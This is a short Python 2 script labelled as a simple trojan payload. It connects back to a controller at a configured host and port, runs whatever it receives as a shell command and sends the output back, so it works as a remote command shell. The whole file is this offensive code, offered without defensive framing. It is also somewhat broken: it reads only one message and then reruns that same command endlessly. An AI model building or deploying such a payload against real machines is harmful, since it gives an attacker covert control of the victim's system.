##
# SIMPLE PAYLOAD FOR TROJAN PYTHON 
#@author - Jerome Themee - security analyst 
#@date - 16/07/2015
##
import socket
import subprocess

# target
target_host = "127.0.0.1"
target_port = 8080
localIp = socket.gethostbyname(socket.gethostname())

# create the socket object with python
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((target_host,target_port))

# receive data from trojan
response = client.recv(4096)

#run command function
def run_command(cmd):
    '''given shell command, returns communication tuple of stdout and stderr'''
    return subprocess.Popen(cmd, 
                            stdout=subprocess.PIPE, 
                            stderr=subprocess.PIPE, 
                            stdin=subprocess.PIPE).communicate()
while True:
	outputCommand =  run_command(response)[0]
	client.send(outputCommand)
	print outputCommand
